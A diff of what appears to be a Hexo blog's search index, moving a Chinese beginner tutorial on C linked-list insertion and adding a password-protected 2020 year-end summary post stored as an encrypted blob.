@@ -79,6 +79,51 @@
       </tags>
   </entry>
   <entry>
+    <title>链表-c语言</title>
+    <url>/2020/09/16/2020.9.16%E9%93%BE%E8%A1%A8/</url>
+    <content><![CDATA[<p>Welcome to <a href="https://shmily-ing.github.io/">Shmily-ing’blog</a>! </p>
+<p>下面主要是运用C去实现链表的头插法，尾插法实现有序插入，以及中间插入一个数。</p>
+<span id="more"></span>
+
+<h2 id="头插法"><a href="#头插法" class="headerlink" title="头插法"></a>头插法</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span><span class="comment">// 头插法</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* run this program using the console pauser or add your own getch, system(&quot;pause&quot;) or input loop */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> data ;</span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">	</span><br><span class="line">&#125;<span class="built_in">list</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span> *head,*s;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">list</span> *p;</span><br><span class="line">	head=<span class="literal">NULL</span>;</span><br><span class="line">	</span><br><span class="line">	input();</span><br><span class="line">	<span class="keyword">for</span>(p=head;p!=<span class="literal">NULL</span>;p=p-&gt;next)&#123; <span class="comment">//输出头插法链表数据</span></span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot; %d &quot;</span>,p-&gt;data);</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	</span><br><span class="line">	head = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line">	<span class="keyword">while</span>(i!=<span class="number">100</span>)&#123;</span><br><span class="line">		</span><br><span class="line">		s=(<span class="built_in">list</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">list</span>));</span><br><span class="line">		s-&gt;data=i;</span><br><span class="line">		s-&gt;next = head;  <span class="comment">//第一个数据地址为空，下一个指向前一个s；</span></span><br><span class="line">		head = s;          <span class="comment">//作为新头部；</span></span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="尾插法的有序插入"><a href="#尾插法的有序插入" class="headerlink" title="尾插法的有序插入"></a>尾插法的有序插入</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">         <span class="keyword">char</span> data;</span><br><span class="line">          <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;linklist;</span><br><span class="line">  linklist *head,*tail;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">   linklist *p;</span><br><span class="line">   head=tail=<span class="literal">NULL</span>;</span><br><span class="line">   input();</span><br><span class="line">   <span class="keyword">for</span>(p=head;p!=<span class="literal">NULL</span>;p=p-&gt;next)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c\n&quot;</span>,p-&gt;data);</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">char</span> ch;</span><br><span class="line">   linklist *t;</span><br><span class="line">   ch=getchar();</span><br><span class="line">   <span class="keyword">while</span>(ch!=&amp;apos;@&amp;apos;)&#123;</span><br><span class="line">       t=(linklist *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linklist));</span><br><span class="line">       t-&gt;data=ch;</span><br><span class="line">       <span class="keyword">if</span>(head==<span class="literal">NULL</span>)&#123;</span><br><span class="line">       head=t;</span><br><span class="line">       t-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">       tail-&gt;next=t;</span><br><span class="line">&#125;</span><br><span class="line">   tail=t;</span><br><span class="line">   tail-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">   t=(linklist *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linklist));</span><br><span class="line">   ch=getchar();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<hr>
+<h3 id="插入有序链表一个数"><a href="#插入有序链表一个数" class="headerlink" title="插入有序链表一个数"></a>插入有序链表一个数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span>     <span class="comment">//实现简单的有序链表插入 </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* run this program using the console pauser or add your own getch, system(&quot;pause&quot;) or input loop */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> data ;</span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">	</span><br><span class="line">&#125;<span class="built_in">list</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span> *head,*tail;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input_inset</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">list</span> *p; </span><br><span class="line">	head=tail=<span class="literal">NULL</span>;</span><br><span class="line">	input_inset();</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">for</span>(p=head;p!=<span class="literal">NULL</span>;p=p-&gt;next)&#123;     </span><br><span class="line">	</span><br><span class="line">	          <span class="built_in">printf</span>(<span class="string">&quot; %d &quot;</span>,p-&gt;data);         </span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input_inset</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,num;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">list</span> *t,*T,*pp;</span><br><span class="line">	t = (<span class="built_in">list</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">list</span>));</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line">	<span class="keyword">while</span>(i!=<span class="number">100</span>)&#123;</span><br><span class="line">		</span><br><span class="line">		t-&gt;data = i;</span><br><span class="line">		<span class="keyword">if</span>(head==<span class="literal">NULL</span>)&#123;  </span><br><span class="line">	</span><br><span class="line">		    head = t;     </span><br><span class="line">		    t-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> tail-&gt;next=t;</span><br><span class="line">	</span><br><span class="line">	tail = t;   </span><br><span class="line">	</span><br><span class="line">	tail-&gt;next=<span class="literal">NULL</span>;  </span><br><span class="line">	</span><br><span class="line">	t = (<span class="built_in">list</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">list</span>));</span><br><span class="line">	</span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//插入操作 </span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;请输入插入点的前一个数字:\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;num);</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">for</span>(pp=head;pp!=<span class="literal">NULL</span>;pp= pp-&gt;next)&#123;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span>(pp-&gt;data==num)&#123;</span><br><span class="line">			</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;请输入要插入的数字:\n&quot;</span>);</span><br><span class="line">	</span><br><span class="line">			T = (<span class="built_in">list</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">list</span>));</span><br><span class="line">	</span><br><span class="line">			<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;T-&gt;data);</span><br><span class="line">			</span><br><span class="line">			</span><br><span class="line">			T-&gt;next=pp-&gt;next;</span><br><span class="line">			</span><br><span class="line">			pp-&gt;next = T;</span><br><span class="line">		</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;输出插入后的链表\n&quot;</span>);	</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>多谢刘**的指导（内心抗拒）</p>
+<p>可能写的不是很完美，感谢大佬的访问~~ORZ</p>
+]]></content>
+      <categories>
+        <category>C语言</category>
+      </categories>
+      <tags>
+        <tag>算法与数据结构</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>2020总结</title>
+    <url>/2021/02/06/2020%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
+  <script id="hbeData" type="hbeData" data-hmacdigest="fb019f63dea109d9fadf7d96232539285e089d151e19e57b624edd6fae8266cd">792211fae0f67a76b537e59fee9c2dab1daa41aa57e19023a9c46972eb7bec605162ac581642f42cb4fadcc908a6dcde966bb263ff9e23df3f37df013b613928a7c1f47986677b593afe1b1a12d171a6d217ba32affbb538d4b2e67a151ad2bcccf594e20f357d8af32445734a5de93275111a1849d1c6380ef7d3613509899e824e57f6402d9157d86339bf1c35fdd7d02152385c75a2b2dec5eca877221e9c03761fa9ae1d2076e657c2a49c69fc366e3f62f82c6cc095fd85ae3bfff90b077afe6f509ddf69b197d6acae3800fa4a4e73fa9bac4ad7c1c3eeaaa8f77bda019bee75d5b69a1f069d6442ecf0dedf64db33e7236cf4d2cd6d397131af4d0cb0673cddbe4f595ad75cac0067b6fa4ea1360eca1aa14259fc35ead18a4793027578d34278cd4c27f452c9d544b19170655ae6347a2c07ec141a433b26efe327de9a6541243bf97697b8b72d69515da1adaa0c1a3fa65af922f057ef8c43222994aff1ec12c0c2925ed4e8052a97afdb1cd6c4a9b25b4d66bbbbc3522fe5ea883c0c88f02f92c5c4edd415dad8d1e80c1f18bb6e6636c48ef32799a8a86ae0a801805260d69876e7d3ffce4c5c46c24bb346ffbda7479f592024dfe1293f9c4082f2f2248a35fcebca655cd02b139254638ecc82e7db8d141a81ab470a9a2582ab1364be25f20f7c0414da5dda8cdced80add8fa4552c0cfcd38407c4af3dfecb2a6d9df32ab0cc3d3108450fb83d65389ec6460de72488b9de1e20192e34b9c2a19e367b361fab61ef52fc2f5d6f76f9906f656c6bd361108032a769a8cc8b5d37b5cdcd12d3bd0cfaa4c41d3b9cbb7ae54a6ad721f8d3640753eb5e417e623b671952005d5b13d8f4d2a8c96769270b18d45d7b050eff938243e1846a747137604277364f8f772c95a96e64493780477e33c4cb841c30e5252af1bf651618beef24ac574c7e9ada427e1c9ee9ad08fa57f940781aeae416fcf4aa2406714ccb6ec4b8c35cb36445859e1b77c1fdeb835a0290cc648197a34e777056ca03491095c5d2c0d114b65b126634bdda88fbaa2255992e959c0e23343fd64ee273d21802d89340d476b63b94a0a5074545fd345e71200f68014c949b8a78685c0c4dc4b9a9996d000c4c84c918b0f11beb34f6ad5dfebdd82d7bbac04dece7f4166ea8a3e2ec769c1807d8ac6f326826a79e81da695d9d644749a6f645860d6d0c0bf588723e2b8261d6143670775e814a2e6bdbe8b434d74fcb6758e7df3e6c1c7be41f9041c47ac47be258fafa6ac1cfc0b6b533da4bb12a3c6ad1384c0fb439428c19c6a1d823343b9b87bf3817da8b0c5b3c3f11bb60d79c0cb82738b89717147aebf8061593c7ca8fa1eea1e4382afb14cc54b5b7790ee38acb26b84998600b154f7ce16623494d6240eda8b79410eef31aa89dbe2a050637cbb624c81ac4f49e17f0fdcc49ba3b435a45e3f37b502ccde5a0141bbd1f1bd58ba25c94815eb37eb4c84dd3ff96ad1ca21a1fcd14f85c2c6a1fd021bfaf7d7806951e78a5ede641a9f758a8c65026b4f6f5847b55bf77bbc9a07ae2adc7d8c2bf2cdaa2db95a5433dd9cf2741bf2af8f2ccc193974f07b08a26654f3f4ae83bbd05f549183f9e861d56cb2388b353a35338ef5ff27acd444b18707a63047f94990cafe9d1c074f3e39fd4a801c3fbf22af821202af2d8d8e9d1832ee0bca257e38b574a5dd786220b4d05b47def8827c013a9d2d9feadac184cd5ff061e282e9bad3ec2f9fee25d23754a23aa0bc95ae6fd885777eeb8afb6df415e4235d6cf10dde4ccb2094cbfa4dd38087a36bbd5ca0c03387b4f08aea0ccdf9b0e6525f53c70de5a8d07989fdd083ef500a20564254c835fc32b80119cd1cdeb1ba17c87e719f219adf439286591f83ba7d06b5496900f10d17e94a57c3f46b7dd617e81a71eb5f41e5b5125772158d5fd1f4c4a90237aa343c203e19f32100e01994400f899abf54b3f020a5fc6f436ee503965b708cf3931dd1a76525f22a2775304d317ef022b457f9305997f8c78bc3cadf2024f067492113669798c60dbbde9ef5de588401fcef52bd4cf33e95bcc2c642bf45416f26b0c04ab90625472047e78672fee3c8a7bff2ca9897aabea89651fdb3e07a26ac89372885e1c87e2b1d4a30b198a7c2bd587cc3ee063b499cdeaa2efa47412213dd288bd776262363d8802db2108d8397df176d590dc449ea433a6d2790d854aedf0ca9e41d17c5f4a786bc9c93ddb96bbb1a2de0ad944ccf70b099bf02abadbf84e071f5418ccf2f7f25907e839eb3dbd5eb6cdb334f9e25f43bf4bc5974dd2974d3da11bd9b9c4917e579bf74380d19384bcca7b56abebd1c6808eb9c879920c462713bf73d9920944678da1c68332e009101c21cf4addf52e0cc873d88f86e4c6715b0c42d2d61c82500a6db101ab83f3640dab660bc8ef770fbca19b02758607e402d9f96c16910beb0a700279d4c385740caa3ebb39ec7cc248d2e6189c92575dc85ac658a81b45c4116500379fc91faf7bc08940d8b729864af184cfb08c0c6999b24d8a58290b4ce431acdb2a35b91153ab52408759c2b1b0726ebbedf2b293d90187bcecf4d9a3c477a7ab92fa622109ae064ad834b2a03b40c941e2bbdf859b79077c7aa654ecdc01e8153cd12fc617c04fb70a0eb2066ae937e2b57f4dc04e0ab298d37c88761fbc7350e14fe10f2aada11410211a7087955178465090f641683ea17884377427547665268357b390290d5524c0408cc24f5921c16cd6f6137f14304ea9380b66488dd2f806a3d2c54bffb6a29c9a3ca2360313219da1ffbdaee5de55e30678526e1383855cc6fc192e2a61f3b14bbfee4176cf90ada541676d5ab537b998eec2449feb0005a4c1a310746a76cae02eb28c41417c71d773010a929338efd6696816053062f6b999b4c50ead027ebbf7ef1e6a71b8abc855271f2c8e9077907c5e39a5068f4b697e073b0c1d0c727c6b616aac8034b1078ab78b4d032f22e59d4267c025ad5e7215e11a5f9909aed466b8b58d026f9a24be85668931f99537779044274828e0db16e229aa9f16a21bed219903e0b404b6368da9a5462bf8ba98dd4298fb8989bab9a51c0cc012964eaba6ad080c3b4c1b2f666261555cd073f7c88df3553c26a64cf273486923b6d5736b9744797c3ebe9c282875f6c3deb569684a9866439c1ba1f9b5c4e28fa81108246cadbc4fa25c90623e7c611caa166ccf06a6e8aeb8989a7a38961fcfe008413c785569010cd0976ce52710e22ba1423d8ca254d65321086b86f6415eaa0a98c3bc1a0f8e596223ff62a193541bc48cf5259cc15267f6bf704e00e0c06f81efa4ad1ad2a3e6e3a86f183fc798e0d69b20a9b51572cdce30d6fc546183e823a78f265ccf67b7dab53640fe28fef165f0c5f00bb9a55aee92d43941da5b4276cae27c210f54c7c04d86c989e3ad034774e4f92628384e99f7e5f6237bc6416f4cfc63e58668cc14f9440cd3db8a2dfcbd5a572cfc4f32d724640f3beaeb8043f28a5bae0b3c184995e032955eb3b70d1a7a54530467ae0e424be7fb724432ffaa2fe74095132bcb591952d1c5dfed4c6364facd3260da73f6f1f4195bb01d757553bdab14a3a2b1fdf369427e2288e3cac9e853d8856504cbd7092801fbfca57686bcc9f57717f871b07f6183a25b1ba9c97d807dc5c9ce3ec31832c8090424f4e78a3d67e69d89e70886d52d9480e0b3a83b8ad53d572ffd1a8099ac5834851da7b10c0bc7a0a4e7c29104b4cd352c85a76047aee59dc4189b9f2059472c84c4b14dc49074bbe0151a351c7d768ef4511fa9136335a1172429391aba5cae8b1135a26a95a608d59792fff5f09ed578daa9a5e8fba0bf12ceedc7bde0c81d37488ed3af0f2801dd507e52970d688ba0e40703ed64faa243f71b10f20b81df2ffbcfd7a06318d1ee87f77e2d1ec1dcff3661d51b06a581e02d429e5ee2ee43ac1effa2d485293759c4b0e2478188198110c0679454936696f9b842327d90c63787fc73d405a9e22b0e26767f5eb4c40208d0f259d1b43ad790a66484c37c26c71b2335ae6a35d6ed8afa90000a7277461729c4f8d39a4d81d400b79e491ac4f01bc94fcd966508dc53e6131500c905afa0d76e6369c2f63c9361db8610957a703554228ce13262ed6573010235d3a2501dec31741bf0f3be50ed49525362c7ff51457cc976958b604beaa777859f67a1796a71afa8f00aaf00c07e88f2e2f184128e29aec344119618b1f79f4574424a5b767ef7d9438858d03e443ae5955e8dbb3328eedd7842b52a48c570ddb5e4ac910454f8abe8165984cc96224e68d817f67ecbb896fb29dbff9fc5e06d7b5aa0a881e05ab2f315413a7a085e65cab0c322f3e71743eb2416c21667791bd6c495e2691218a6c86a7a9f6cc167774c960c7e971ee47fc09fbed9761115ff8eaaa42d0e206a5c9c3f78c11f1198502898724144a3b586d8383d3d5e9b6367f20a5768fd55fb6bd3cf02e203e2de2c0e3d4bd98a250c363017716f79f5662b8c004d33c4a7c61da6303291bfb9978c702653212a80ee4bf7528c981595a5092c17d8e449235dde47136f341889b6a53ffadd510bb24f027c9e731f29395b3a8b2b501a58354aa86e52da009e6f089b66ebf32fbc1269d65e101396195c4636b84176900251b125ee9927f9270</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码是我的qq</span>
+      </label>
+    </div>
+  </div>
+</div>
+<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
+      <categories>
+        <category>经历</category>
+      </categories>
+      <tags>
+        <tag>对2020年总结</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>BUU- [GWCTF 2019]</title>
     <url>/2020/09/27/2020-9-27buuctf/</url>
     <content><![CDATA[<p>Welcome to <a href="https://shmily-ing.github.io/">Shmily-ing’blog</a>! </p>
@@ -152,51 +197,6 @@
       </tags>
   </entry>
   <entry>
-    <title>链表-c语言</title>
-    <url>/2020/09/16/2020.9.16%E9%93%BE%E8%A1%A8/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://shmily-ing.github.io/">Shmily-ing’blog</a>! </p>
-<p>下面主要是运用C去实现链表的头插法，尾插法实现有序插入，以及中间插入一个数。</p>
-<span id="more"></span>
-
-<h2 id="头插法"><a href="#头插法" class="headerlink" title="头插法"></a>头插法</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span><span class="comment">// 头插法</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* run this program using the console pauser or add your own getch, system(&quot;pause&quot;) or input loop */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> data ;</span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">	</span><br><span class="line">&#125;<span class="built_in">list</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span> *head,*s;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">    <span class="built_in">list</span> *p;</span><br><span class="line">	head=<span class="literal">NULL</span>;</span><br><span class="line">	</span><br><span class="line">	input();</span><br><span class="line">	<span class="keyword">for</span>(p=head;p!=<span class="literal">NULL</span>;p=p-&gt;next)&#123; <span class="comment">//输出头插法链表数据</span></span><br><span class="line">	</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot; %d &quot;</span>,p-&gt;data);</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i;</span><br><span class="line">	</span><br><span class="line">	head = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line">	<span class="keyword">while</span>(i!=<span class="number">100</span>)&#123;</span><br><span class="line">		</span><br><span class="line">		s=(<span class="built_in">list</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">list</span>));</span><br><span class="line">		s-&gt;data=i;</span><br><span class="line">		s-&gt;next = head;  <span class="comment">//第一个数据地址为空，下一个指向前一个s；</span></span><br><span class="line">		head = s;          <span class="comment">//作为新头部；</span></span><br><span class="line">		<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<h2 id="尾插法的有序插入"><a href="#尾插法的有序插入" class="headerlink" title="尾插法的有序插入"></a>尾插法的有序插入</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">         <span class="keyword">char</span> data;</span><br><span class="line">          <span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;linklist;</span><br><span class="line">  linklist *head,*tail;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">   linklist *p;</span><br><span class="line">   head=tail=<span class="literal">NULL</span>;</span><br><span class="line">   input();</span><br><span class="line">   <span class="keyword">for</span>(p=head;p!=<span class="literal">NULL</span>;p=p-&gt;next)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c\n&quot;</span>,p-&gt;data);</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input</span><span class="params">()</span></span>&#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">char</span> ch;</span><br><span class="line">   linklist *t;</span><br><span class="line">   ch=getchar();</span><br><span class="line">   <span class="keyword">while</span>(ch!=&amp;apos;@&amp;apos;)&#123;</span><br><span class="line">       t=(linklist *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linklist));</span><br><span class="line">       t-&gt;data=ch;</span><br><span class="line">       <span class="keyword">if</span>(head==<span class="literal">NULL</span>)&#123;</span><br><span class="line">       head=t;</span><br><span class="line">       t-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">       tail-&gt;next=t;</span><br><span class="line">&#125;</span><br><span class="line">   tail=t;</span><br><span class="line">   tail-&gt;next=<span class="literal">NULL</span>;</span><br><span class="line">   t=(linklist *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(linklist));</span><br><span class="line">   ch=getchar();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<hr>
-<h3 id="插入有序链表一个数"><a href="#插入有序链表一个数" class="headerlink" title="插入有序链表一个数"></a>插入有序链表一个数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span>     <span class="comment">//实现简单的有序链表插入 </span></span></span><br><span class="line"> <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* run this program using the console pauser or add your own getch, system(&quot;pause&quot;) or input loop */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">	</span><br><span class="line">	<span class="keyword">int</span> data ;</span><br><span class="line">	</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">node</span> *<span class="title">next</span>;</span></span><br><span class="line">	</span><br><span class="line">&#125;<span class="built_in">list</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">list</span> *head,*tail;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input_inset</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">list</span> *p; </span><br><span class="line">	head=tail=<span class="literal">NULL</span>;</span><br><span class="line">	input_inset();</span><br><span class="line">	</span><br><span class="line">		<span class="keyword">for</span>(p=head;p!=<span class="literal">NULL</span>;p=p-&gt;next)&#123;     </span><br><span class="line">	</span><br><span class="line">	          <span class="built_in">printf</span>(<span class="string">&quot; %d &quot;</span>,p-&gt;data);         </span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">input_inset</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,num;</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">list</span> *t,*T,*pp;</span><br><span class="line">	t = (<span class="built_in">list</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="built_in">list</span>));</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;i);</span><br><span class="line">	<span class="keyword">while</span>(i!=<span class="number">100</span>)&#123;</span><br><span class="line">		</span><br><span class="line">		t-&gt;data = i;</span><br><span class="line">		<span class="keyword">if</span>(head==<span class="literal">NULL</span>)&#123;  </span><br><span class="line">	</span><br><span class="line">		    head = t;     </span><br><span class="line">		    